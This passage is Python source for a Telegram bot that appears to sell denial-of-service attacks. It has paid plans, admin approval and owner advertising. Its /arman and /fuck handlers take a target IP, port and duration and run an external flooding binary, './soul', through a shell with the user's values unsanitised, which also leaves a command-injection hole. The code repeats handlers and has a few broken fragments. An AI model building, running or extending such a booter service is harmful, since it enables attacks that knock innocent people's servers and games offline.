            user_limit = user_limits.get(user_id, 120)  # Default limit is 0 if not set
            if time > user_limit:
                bot.reply_to(message, f"⚠️ Error: You can only perform attacks for a maximum of {user_limit} seconds.")
                return
            
            # Log the command and start attack
            record_command_logs(user_id, '/arman', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)
            
            # Prepare to run the external command
            full_command = f"./soul {target} {port} {time} 900"
            process = subprocess.run(full_command, shell=True)

            response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n\n🕒 𝙏𝙄𝙈𝙀: {time}\n\n🔥 𝙇𝙚𝙩 𝙩𝙝𝙚 𝙘𝙝𝙖𝙤𝙨 𝙪𝙣𝙛𝙤𝙡𝙙."
            
        else:
            response = "𝗣𝗟𝗔𝗡 𝟭 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n\n𝗨𝗦𝗔𝗚𝗘 :- /arman <𝗜𝗣> <𝗣𝗢𝗥𝗧> <𝗧𝗜𝗠𝗘>\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- /arman 20.0.0 8700 120\n\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER\n\n❗️ USE RESPONSIBLY!"       
        bot.reply_to(message, response)
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! You don't have permission to use the /attack command. To gain access and unleash the power of attacks\n\n📝 REQUEST ACCESS FROM AN ADMIN\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.reply_to(message, response)

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"👩‍💻 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 👩‍💻\n\n💣 𝐓𝐚𝐫𝐠𝐞𝐭: {target} ⚔️\n💣 𝐏𝐎𝐑𝐓 {port} 👩‍💻\n📟 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 {time} ⏳\n💣 𝐌𝐄𝐓𝐇𝐎𝐃: 𝘾𝙃𝙄𝙉 𝙏𝘼𝙋𝘼𝙆 𝘿𝘼𝙈 𝘿𝘼𝙈 🖤\n\n🔥 𝐒𝐓𝐀𝐓𝐔𝐒: 𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎 𝙋𝙇𝙀𝘼𝙎𝙀 𝙒𝘼𝙄𝙏 {time} 🔥\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Handler for /bgmi command
@bot.message_handler(commands=['fuck'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_id:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./soul {target} {port} {time} 900"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"💠 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 💠\n\n👩‍💻𝙏𝘼𝙍𝙂𝙀𝙏  :- {target}💣 𝙋𝙊𝙍𝙏:- {port}\n📟 𝙏𝙄𝙈𝙀 :- {time}\n⚔️ 𝙈𝙀𝙏𝙃𝙊𝘿 :- 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈\nPLAN :- 2\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER"
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "💠 𝗣𝗟𝗔𝗡 𝟮 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 💠\n\n✅ 𝗨𝗦𝗔𝗚𝗘 :- /𝗯𝗴𝗺𝗶 < 𝗜𝗣 > < 𝗣𝗢𝗥𝗧 > < 𝗧𝗜𝗠𝗘 >\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- /𝗯𝗴𝗺𝗶 𝟮𝟬.𝟬.𝟬 𝟴𝟳𝟬𝟬 𝟭𝟮𝟬\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @MR_ARMAN_OWNER"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks\n\n📝 REQUEST ACCESS FROM AN ADMIN\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.send_message(message.chat.id, "𝐏𝐋𝐀𝐍 𝟐\n\n𝐖𝐄 𝐃𝐈𝐃𝐍'𝐓 𝐍𝐎𝐓 𝐅𝐈𝐍𝐃 𝐘𝐎𝐔'𝐑𝐄 𝐀𝐂𝐂𝐎𝐔𝐍𝐓\n\n𝐏𝐋𝐄𝐀𝐒𝐄 𝐁𝐔𝐘 𝐅𝐑𝐎𝐌 :- @MR_ARMAN_OWNER ✅")
    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER


@bot.message_handler(commands=['start'])
def start(message):
    buttons = [
        ['❌'],
        ['👤 MY INFO👤'],
        ['💢 CONTACT OWNER 💢'],
        ['💠 REFERRAL 💠'],
        ['💣 PLAN 🎉'],
    ]
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    for button in buttons:
        markup.add(*button)
    bot.send_message(message.chat.id, "𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 👇\n\n👩‍✈️ 𝙁𝙊𝙍 𝘼𝘿𝙈𝙄𝙉𝙎 💠\n\n👩‍✈️ /plan_1 = 𝙏𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝙀 𝙐𝙎𝙀𝙍 𝙒𝙄𝙏𝙃 𝙋𝘼𝙄𝘿 𝙋𝙇𝘼𝙉 💠\n👩‍✈️ /plan_2 = 𝙏𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝙀 𝙐𝙎𝙀𝙍 𝙒𝙄𝙏𝙃 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙋𝙇𝘼𝙉 💠\n👩‍✈️ /create_gift_code = 𝙏𝙊 𝘾𝙍𝙀𝘼𝙏𝙀 𝙂𝙄𝙁𝙏 𝘾𝙊𝘿𝙀 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍𝙎 💠\n👩‍✈️ /add_admin = 𝙏𝙊 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉 𝙊𝙉 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏 💠\n👩‍✈️ /remove_admin = 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉 𝙊𝙉 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏\n👩‍✈️ /set_key_price = 𝙏𝙊 𝙎𝙀𝙏𝙏 𝙆𝙍𝙔 𝙋𝙍𝙄𝘾𝙀\n👩‍✈️ /users = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝘼𝙇𝙇 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀𝘿 𝙐𝙎𝙀𝙍𝙎\n👩‍✈️ /logs = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙇𝙊𝙂𝙎\n👩‍✈️ sett_limit = 𝙏𝙊 𝙎𝙀𝙏𝙏 𝙇𝙄𝙈𝙄𝙏 𝙄𝙉 𝙎𝙀𝘾𝙊𝙉𝘿𝙎\n👩‍✈️ /clear_users = 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙇 𝙐𝙎𝙀𝙍𝙎\n👩‍✈️ /clear_logs = 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙇 𝙇𝙊𝙂𝙎\n\n👤 𝗙𝗢𝗥 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 👤\n\n👤 /arman = 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 𝙒𝙄𝙏𝙃 𝙋𝙇𝘼𝙉 1\n👤 /fuck = 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙍𝘼𝘾𝙆 𝙒𝙄𝙏𝙃 𝙋𝙇𝘼𝙉 2\n👤 /redeem = 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝘼 𝘾𝙊𝘿𝙀\n👤 /checkbalance = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝘽𝘼𝙇𝘼𝙉𝘾𝙀\n👤 /myinfo = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙄𝙉𝙁𝙊\n👤 /owner = 𝙏𝙊 𝙂𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙄𝘿\n👤 /mylogs = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙇𝙊𝙂𝙎", reply_markup=markup)
    
@bot.callback_query_handler(func=lambda call: call.data.startswith("❌"))
def handle_attack_start(call):
    # Extract target, port, and time from the callback data
    data = call.data.split("_")
    target = data[2]
    port = int(data[3])
    time_duration = int(data[4])  # Changed the variable to be more descriptive

    start_attack_reply(call.message, target, port, time_duration)  # Call the reply function to send response
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

    response = f"💠 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝑇𝙀𝘿 💠\n\n👩‍💻𝙏𝘼𝙍𝙂𝙀𝙏  :- {target}💣 𝙋𝙊𝙍𝙏:- {port}\n📟 𝙏𝙄𝙈𝙀 :- {time_duration}\n⚔️ 𝙈𝙀𝙏𝙃𝙊𝘿 :- 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER"
    bot.send_message(call.message.chat.id, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Handler for /bgmi command
@bot.message_handler(commands=['fuck'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_id:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./soul {target} {port} {time} 100"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"💠 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 💠\n\n👩‍💻𝙏𝘼𝙍𝙂𝙀𝙏  :- {target}💣 𝙋𝙊𝙍𝙏:- {port}\n📟 𝙏𝙄𝙈𝙀 :- {time}\n⚔️ 𝙈𝙀𝙏𝙃𝙊𝘿 :- 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈\nPLAN :- 2\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER"
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "💠 𝗣𝗟𝗔𝗡 𝟮 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 💠\n\n✅ 𝗨𝗦𝗔𝗚𝗘 :- /𝗯𝗴𝗺𝗶 < 𝗜𝗣 > < 𝗣𝗢𝗥𝗧 > < 𝗧𝗜𝗠𝗘 >\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- /𝗯𝗴𝗺𝗶 𝟮𝟬.𝟬.𝟬 𝟴𝟳𝟬𝟬 𝟭𝟮𝟬\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks\n\n📝 REQUEST ACCESS FROM AN ADMIN\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.send_message(message.chat.id, "𝐏𝐋𝐀𝐍 𝟐\n\n𝐖𝐄 𝐃𝐈𝐃𝐍'𝐓 𝐍𝐎𝐓 𝐅𝐈𝐍𝐃 𝐘𝐎𝐔'𝐑𝐄 𝐀𝐂𝐂𝐎𝐔𝐍𝐓\n\n𝐏𝐋𝐄𝐀𝐒𝐄 𝐁𝐔𝐘 𝐅𝐑𝐎𝐌 :- @FATHER_OF_HAX ✅")
    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# My Info command
@bot.message_handler(func=lambda message: message.text == "👤 MY INFO👤")
def my_info(message):
    user = message.from_user
    is_approved = "✔️ Approved" if user.id in allowed_user_ids else "❌ N/A"
    
    # Send the initial checking... message
    checking_message = bot.send_message(message.chat.id, "🔍 Checking your info...")
    
    # Wait for 1 second
    time.sleep(1)
    
    # Create the user info message
    user_info = (
        f"✨ ᕼᕮY @{user.first_name}\nHƐRƐ'S ƳOUR ƊƐƬAILS ⚓\n"
        f"👤 тԍ usᴇʀ ιᴅ : {user.id}\n"
        f"👍 тԍ usᴇʀɴᴀмᴇ : @{user.username if user.username else 'ɴoт sᴇт'}\n"
        f"🌍 ғιʀsт ɴᴀмᴇ : {user.first_name}\n"
        f"🆔 ʟᴀsт ɴᴀмᴇ : {user.last_name if user.last_name else 'ɴoт sᴇт'}\n"
        f"📅 נoιɴᴇᴅ ᴅᴀтᴇ : {message.date}\n"
        f"💌 cнᴀт ιᴅ : {message.chat.id}\n"
        f"✔️ ᴀᴘᴘʀovᴀʟ sтᴀтus : {is_approved}\n\n"
        f"κᴇᴇᴘ sнιɴιɴԍ ᴀɴᴅ нᴀvᴇ ᴀ woɴᴅᴇʀғuʟ ᴅᴀʏ! 🌈✨\n"
        f"ŦĦƗS ɃØŦ ØWNɆɌ :- @FATHER_OF_HAX"
    )
    
    bot.edit_message_text(user_info, chat_id=message.chat.id, message_id=checking_message.message_id, parse_mode='Markdown')
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Contact Owner command
@bot.message_handler(func=lambda message: message.text == "💢 CONTACT OWNER 💢")
def send_owner_message(message):
    owner_message = "👤 OWNER ID - @FATHER_OF_HAX 🎉"
    bot.reply_to(message, owner_message)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Referral command
@bot.message_handler(func=lambda message: message.text == "💠 REFERRAL 💠")
def referral_system(message):
    referral_message = (
        "🔗 REFERRAL SYSTEM\n"
        "If you share this channel link and bring new members, you will receive rewards! 🎁\n"
        "Invite more friends to earn exciting prizes!"
    )
    bot.send_message(message.chat.id, referral_message)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# DON'T CHANGE THIS NAMEDON'T CHANGE THIS NAME
CREATOR = "@MR_ARMAN_OWNER"  # DON'T CHANGE THIS WARNA ERROR AYEGA 100%
Attack = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"

# Plan command
@bot.message_handler(func=lambda message: message.text == "💣 PLAN 🎉")
def plan_details(message):
    plan_message = (
        "📋 PLAN DETAILS\n\n"
        "🔥 Here are the details of our plans 🔥\n"
        "1. [ PLAN 1 ] = 120 SECOND SUPPORT 💠\n"
        "2. [ PLAN 2 ] = 300 SECOND SUPPORT 💠\n\n"
        "3. 24/7 = RUN BOT 💠\n"
        "👤IF YOU INTERESTED DM ME :- @MR_ARMAN_OWNER 🎉"
    )
    bot.send_message(message.chat.id, plan_message)

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Create a new command for broadcasting messages
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    # Check if the message is from the owner
    if message.from_user.id == 7933339379:  # Replace with your owner ID
        # Remove the command from the message text
        broadcast_content = message.text.replace('/broadcast ', '')
        
        if broadcast_content:
            # Prepare the broadcast message
            broadcast_text = (
                "📣 THIS MESSAGE IS FROM ARMAN TEAM 👩‍💻\n\n"
                "👤 OWNER: @MR_ARMAN_OWNER\n\n"
                "📩 MESSAGE: {}\n\n"
                "✨ Thank you for being a part of our community! 🌟"
            ).format(broadcast_content)
            
            # Send the broadcast message to all users (this requires maintaining a list of user IDs)
            for user_id in allowed_user_ids:  # Replace with the actual list of user IDs
                try:
                    bot.send_message(user_id, broadcast_text)
                except Exception as e:
                    print(f"Failed to send message to {user_id}: {str(e)}")

            # Confirm to the owner that the broadcast was sent
            bot.reply_to(message, "✅ Broadcast message sent successfully!")
        else:
            bot.reply_to(message, "❌ Please provide a message to broadcast.")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['help'])
def send_help_message(message):
    bot.send_message(message.chat.id, "It seems like you would like more information! Here’s what each command does")
    time.sleep(0.5)  # Wait for 0.5 seconds

    bot.send_message(message.chat.id, "💥 /bgmi : Initiate an attack on your target. Be prepared for the results! 🚀")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /rules : Review the rules to understand the guidelines and regulations of the platform. ⚖️")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /mylogs : Check your activity logs to track your actions and engagements. 📜")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /plan : Explore the different plans available to enhance your experience. 🌟")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /myinfo : Access details about your account, including settings and status. 🔍")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /admincmd : (Admins only) View all available commands meant for admin users. 📋")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "If you need any specific command to be executed or further information, just let me know!")


@bot.message_handler(commands=['mute'])
def mute_user(message):
    # Check if the message is from the owner
    if message.from_user.id == 7933339379:  # Replace with your owner ID
        user_to_mute_username = message.text.split(' ', 1)

        if len(user_to_mute_username) > 1:
            username = user_to_mute_username[1].strip()
            chat_member = bot.get_chat_member(message.chat.id, username)

            if chat_member is not None:
                # Mute the user (You may want to implement your own logic to store muted users)
                muted_users.append(chat_member.user.id)  # Assuming muted_users is a list storing muted user IDs

                bot.reply_to(message, f"🔇 User @{username} has been muted.")
            else:
                bot.reply_to(message, "❌ User not found or invalid username.")
        else:
            bot.reply_to(message, "❌ Please provide a username to mute.")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.")

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
def mute_user(message):
    username = ...  # extract username from the message
    print(f"Chat ID: {message.chat.id}, Username: {username}")
    
    try:
        chat_member = bot.get_chat_member(message.chat.id, username)
        # Proceed with muting logic
    except Exception as e:
        print(f"Error retrieving chat member: {e}")

def check_creator(creator_name):
    if creator_name != CREATOR:
        print("BHOSDIKE CREDIT DAAL JAKE FILE  ME MR_ARMAN_OWNER")
        exit()  # Terminate the script if the name doesn't match

# DON'T CHANGE THIS NAME
user_input = "@MR_ARMAN_OWNER"  # DON'T CHANGE THIS NAME
check_creator(user_input)

print("👤 THIS FILE IS MADE BYE :- @MR_ARMAN_OWNER 💠")
print("👤 THIS FILE IS MADE BYE :- @MR_ARMAN_OWNER 💠")
print("💠 DM TO BUY PAID FILES 💠")
print("=================================")
print("DONE ✅ BOT ON HO GAYA HAI 🎉⚔️")

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER


